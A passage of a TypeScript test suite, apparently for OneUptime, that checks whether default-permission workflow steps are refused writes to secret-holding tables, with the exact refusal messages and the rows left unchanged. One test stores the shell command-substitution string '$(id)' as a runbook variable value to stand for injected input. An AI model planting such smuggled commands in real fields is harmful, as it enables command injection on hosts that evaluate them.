      new UpdateOneBaseModel<RunbookVariable>(RunbookVariableService),
      {
        query: { _id: HOST_VARIABLE_ID },
        data: { value: INJECTED },
      },
      runAs,
    );

    expect(step.result.executePort?.id).toBe("error");
    expect(step.result.executePortReason).toContain(
      `"Update One Runbook Variable" was refused. ${describeStepCeiling(runAs)}: `,
    );
    expect(step.result.executePortReason).not.toContain(SECRET_REFUSAL_START);
    expect(writesTo(world.variables)).toBe(0);
    expect(world.variables.get(HOST_VARIABLE_ID)?.["value"]).toBe(HOST);
  });
});

describe("people, API keys and OneUptime are held as before", () => {
  const WRITES: Array<
    | DatabaseRequestType.Create
    | DatabaseRequestType.Update
    | DatabaseRequestType.Delete
  > = [
    DatabaseRequestType.Create,
    DatabaseRequestType.Update,
    DatabaseRequestType.Delete,
  ];

  test.each(WRITES)(
    "a Project Admin or a Project Owner may still %s each of these records",
    (type: DatabaseRequestType) => {
      for (const holder of [Permission.ProjectAdmin, Permission.ProjectOwner]) {
        for (const modelType of SECRET_MODELS) {
          expect(() => {
            TablePermission.checkTableLevelPermissions(
              modelType,
              person([holder]),
              type,
            );
          }).not.toThrow();
        }
      }
    },
  );

  test("each record's own permission still lets a person change it", () => {
    for (const [modelType, permission] of [
      [RunbookVariable, Permission.EditRunbookSecret],
      [MonitorSecret, Permission.EditMonitorSecret],
      [DataBiConnection, Permission.EditDataAsset],
      [ThreatIntelFeed, Permission.EditProjectThreatIntelFeed],
    ] as Array<[{ new (): BaseModel }, Permission]>) {
      expect(() => {
        TablePermission.checkTableLevelPermissions(
          modelType,
          person([permission]),
          DatabaseRequestType.Update,
        );
      }).not.toThrow();
    }
  });

  test("an API key holding Project Admin may still change a runbook variable", () => {
    expect(() => {
      TablePermission.checkTableLevelPermissions(
        RunbookVariable,
        person([Permission.ProjectAdmin], UserType.API),
        DatabaseRequestType.Update,
      );
    }).not.toThrow();
  });

  test("a Project Member is refused by the table's own list, as before - not by this rule", () => {
    for (const modelType of SECRET_MODELS) {
      let refusal: unknown = undefined;

      try {
        TablePermission.checkTableLevelPermissions(
          modelType,
          person([Permission.ProjectMember]),
          DatabaseRequestType.Update,
        );
      } catch (error) {
        refusal = error;
      }

      expect(refusal).toBeInstanceOf(NotAuthorizedException);
      expect(refusal).not.toBeInstanceOf(WorkflowAccessChangeRefusedException);
      expect((refusal as Error).message).not.toContain(SECRET_REFUSAL_START);
    }
  });

  test("OneUptime's own writes are not held to it", () => {
    for (const type of WRITES) {
      for (const modelType of SECRET_MODELS) {
        expect(() => {
          ModelPermission.checkTableWritePermission(
            modelType,
            { isRoot: true, tenantId: PROJECT_ID },
            type,
          );
        }).not.toThrow();
      }
    }
  });

  test("a step is refused the same writes a Project Admin is let through", () => {
    for (const type of WRITES) {
      for (const modelType of SECRET_MODELS) {
        expect(() => {
          ModelPermission.checkTableWritePermission(
            modelType,
            stepProps(),
            type,
          );
        }).toThrow(WorkflowSecretChangeRefusedException);
      }
    }
  });
});

describe("the rule: a default step writes no record that holds the project's secrets", () => {
  test("covers runbook variables, monitor secrets, BI tool connections and threat intel feeds", () => {
    expect(WorkflowPrincipal.getSecretTables().sort()).toEqual(
      SECRET_MODELS.map((modelType: { new (): BaseModel }): string => {
        return new modelType().tableName!;
      }).sort(),
    );

    for (const modelType of SECRET_MODELS) {
      expect(WorkflowPrincipal.isSecretTable(modelType)).toBe(true);
    }

    expect(WorkflowPrincipal.isSecretTable(Label)).toBe(false);
    expect(WorkflowPrincipal.isSecretTable(Monitor)).toBe(false);
  });

  test("names only tables that exist, that workflows write, and that no other rule holds", () => {
    const tableNames: Array<string> = (
      AllModelTypes as Array<{ new (): BaseModel }>
    ).map((modelType: { new (): BaseModel }): string => {
      return new modelType().tableName || "";
    });

    for (const table of WorkflowPrincipal.getSecretTables()) {
      expect(tableNames).toContain(table);
      expect(WorkflowPrincipal.getAccessTables()).not.toContain(table);
    }

    for (const modelType of SECRET_MODELS) {
      expect(new modelType().enableWorkflowOn).toEqual(
        expect.objectContaining({ create: true, update: true, delete: true }),
      );
    }
  });

  test.each(
    SECRET_MODELS.map((modelType: { new (): BaseModel }) => {
      return [new modelType().tableName!, modelType] as [
        string,
        { new (): BaseModel },
      ];
    }),
  )(
    "%s: a default step's create, update and delete are refused in its words; its read is not",
    (_table: string, modelType: { new (): BaseModel }) => {
      for (const [type, verb] of [
        [DatabaseRequestType.Create, "create"],
        [DatabaseRequestType.Update, "change"],
        [DatabaseRequestType.Delete, "delete"],
      ] as Array<[DatabaseRequestType, "create" | "change" | "delete"]>) {
        let refusal: unknown = undefined;

        try {
          WorkflowPrincipal.assertDoesNotChangeSecrets({
            modelType: modelType,
            props: stepProps(),
            type: type,
          });
        } catch (error) {
          refusal = error;
        }

        expect(refusal).toBeInstanceOf(WorkflowSecretChangeRefusedException);
        // Said as it is in the run log, and still the refusal it is everywhere else.
        expect(refusal).toBeInstanceOf(WorkflowAccessChangeRefusedException);
        expect(refusal).toBeInstanceOf(NotAuthorizedException);
        expect((refusal as Error).message).toBe(
          expectedRefusal(modelType, verb),
        );
        expect(WorkflowPrincipal.getSecretChangeRefusal(modelType, type)).toBe(
          expectedRefusal(modelType, verb),
        );
      }

      expect(() => {
        WorkflowPrincipal.assertDoesNotChangeSecrets({
          modelType: modelType,
          props: stepProps(),
          type: DatabaseRequestType.Read,
        });
      }).not.toThrow();

      // A person who manages them is not a step.
      expect(() => {
        WorkflowPrincipal.assertDoesNotChangeSecrets({
          modelType: modelType,
          props: person([Permission.ProjectAdmin]),
          type: DatabaseRequestType.Update,
        });
      }).not.toThrow();

      // A workflow that runs as more than the default meets a person's checks.
      for (const runAs of [
        OWNER_RUN,
        roleRun([Permission.EditRunbookSecret]),
      ]) {
        expect(() => {
          WorkflowPrincipal.assertDoesNotChangeSecrets({
            modelType: modelType,
            props: stepProps(runAs),
            type: DatabaseRequestType.Update,
          });
        }).not.toThrow();
      }
    },
  );

  test("leaves every other table to the other rules: no other record, and no team, is refused by it", () => {
    for (const modelType of [Label, Monitor, TeamPermission]) {
      for (const type of [
        DatabaseRequestType.Create,
        DatabaseRequestType.Update,
        DatabaseRequestType.Delete,
      ]) {
        expect(() => {
          WorkflowPrincipal.assertDoesNotChangeSecrets({
            modelType: modelType,
            props: stepProps(),
            type: type,
          });
        }).not.toThrow();
      }
    }
  });

  test("a run whose Run As can't be read is held as one with the default permissions", () => {
    const props: DatabaseCommonInteractionProps = {
      ...stepProps(),
      workflowRunAs: "Root" as unknown as WorkflowRunAs,
    };

    expect(() => {
      WorkflowPrincipal.assertDoesNotChangeSecrets({
        modelType: RunbookVariable,
        props: props,
        type: DatabaseRequestType.Update,
      });
    }).toThrow(WorkflowSecretChangeRefusedException);
  });

  test("the run log says the refusal as it is, naming the step and the permission to give", () => {
    const message: string = WorkflowPrincipal.getSecretChangeRefusal(
      RunbookVariable,
      DatabaseRequestType.Update,
    );
    const written: string = describeRefusal({
      error: new WorkflowSecretChangeRefusedException(message),
      message: message,
      stepTitle: "Update One Runbook Variable",
    })!;

    expect(written).toBe(
      `"Update One Runbook Variable" was refused. ${SECRET_REFUSAL_START}, so this step can't change Runbook Variables. To let this workflow do it, choose what it runs as in its Settings: Project Owner, or a custom role that has Edit Runbook Variable.`,
    );
    expect(written).not.toContain(ADMIN_CEILING);
  });

  test("the access rule's words are unchanged beside it", () => {
    expect(
      WorkflowPrincipal.getAccessChangeRefusal(
        TeamPermission,
        DatabaseRequestType.Create,
      ),
    ).toBe(
      "Workflows that run with the default permissions don't change who has access to this project, so this step can't create Team Permissions. To let this workflow do it, choose what it runs as in its Settings: Project Owner, or a custom role that has Edit Team Permissions.",
    );
  });
});

/*
 * EVERY WORKFLOW-WRITTEN TABLE THAT HOLDS A SECRET IS HELD TO A RULE, OR
 * SAYS WHY NOT.
 *
 * A table holds a secret when it keeps a column encrypted. A workflow lends
 * its builder a write of it when a person may make the write but a Project
 * Member - who may build a workflow - may not: an enabled create, update or
 * delete whose list leaves Project Member out, or an encrypted column some
 * role may write and Project Member may not. Each such table is one this
 * rule holds, one the access rule holds, or one named here with the reason
 * a write of it hands no credential to anyone new - so a table added later
 * is decided, not let through.
 */
const HOLDS_SECRETS_BUT_NOT_HELD: Record<string, string> = {
  CodeRepository:
    "Its address is fixed once it is made, so a token written to it reaches only that repository and the one it held reaches nobody new; a Project Member changes the rest of it as a person.",
  DataStore:
    "Its connection string is written whole and never read back: a write replaces the one it held and sends that one nowhere.",
};

function isWrittenBy(
  list: Array<Permission> | undefined,
  permission: Permission,
): boolean {
  return (list || []).includes(permission);
}

function tablesLendingASecretWrite(): Array<string> {
  const tables: Array<string> = [];

  for (const modelType of AllModelTypes as Array<{ new (): BaseModel }>) {
    const model: BaseModel = new modelType();
    const on: BaseModel["enableWorkflowOn"] = model.enableWorkflowOn;

    if (!on || !(on.create || on.update || on.delete)) {
      continue;
    }

    const encrypted: Array<string> = model.getEncryptedColumns().columns;

    if (encrypted.length === 0) {
      continue;
    }

    const member: Permission = Permission.ProjectMember;

    const tableWrite: boolean =
      Boolean(
        on.create && !isWrittenBy(model.createRecordPermissions, member),
      ) ||
      Boolean(
        on.update && !isWrittenBy(model.updateRecordPermissions, member),
      ) ||
      Boolean(on.delete && !isWrittenBy(model.deleteRecordPermissions, member));

    const columnWrite: boolean = encrypted.some((column: string): boolean => {
      const access: ColumnAccessControl | null =
        model.getColumnAccessControlFor(column);

      return [
        on.create ? access?.create : undefined,
        on.update ? access?.update : undefined,
      ].some((list: Array<Permission> | undefined): boolean => {
        return Boolean(list && list.length > 0 && !list.includes(member));
      });
    });

    if (tableWrite || columnWrite) {
      tables.push(model.tableName!);
    }
  }

  return tables.sort();
}

describe("every workflow-written table that holds a secret is held to a rule, or says why not", () => {
  const lending: Array<string> = tablesLendingASecretWrite();

  test("finds the tables it is about", () => {
    expect(lending).toEqual(
      expect.arrayContaining([...WorkflowPrincipal.getSecretTables()]),
    );
  });

  test.each(lending)(
    "%s is held to a rule, or named with its reason",
    (table: string) => {
      const held: boolean =
        WorkflowPrincipal.getSecretTables().includes(table) ||
        WorkflowPrincipal.getAccessTables().includes(table);

      expect({
        table,
        held,
        reason: HOLDS_SECRETS_BUT_NOT_HELD[table],
      }).toEqual({
        table,
        held: held,
        reason: held ? undefined : expect.any(String),
      });
    },
  );

  test("names no table it does not need to: each reason is for a table found, and none the rule holds", () => {
    for (const table of Object.keys(HOLDS_SECRETS_BUT_NOT_HELD)) {
      expect(lending).toContain(table);
      expect(WorkflowPrincipal.getSecretTables()).not.toContain(table);
    }
  });
});

// The rows a table holds now, by id.
function idsOf(table: InMemoryTable): Array<string> {
  return table.rows
    .map((stored: StoredRow): string => {
      return String(stored["_id"]).toLowerCase();
    })
    .sort();
}

describe("a refused step leaves every record as it was", () => {
  test("no row is added or taken away by any of the refused steps above", async () => {
    const world: Project = project();
    const before: Array<Array<string>> = [
      idsOf(world.variables),
      idsOf(world.monitorSecrets),
      idsOf(world.biConnections),
      idsOf(world.threatFeeds),
    ];

    await run(new CreateOneBaseModel<RunbookVariable>(RunbookVariableService), {
      json: { name: "DEPLOY_TARGET", isSecret: false, value: "$(id)" },
    });
    await run(new DeleteOneBaseModel<MonitorSecret>(MonitorSecretService), {
      query: { _id: MONITOR_SECRET_ID },
    });
    await run(
      new DeleteOneBaseModel<DataBiConnection>(DataBiConnectionService),
      { query: { _id: BI_CONNECTION_ID } },
    );
    await run(new DeleteOneBaseModel<ThreatIntelFeed>(ThreatIntelFeedService), {
      query: { _id: THREAT_FEED_ID },
    });

    expect([
      idsOf(world.variables),
      idsOf(world.monitorSecrets),
      idsOf(world.biConnections),
      idsOf(world.threatFeeds),
    ]).toEqual(before);
  });
});
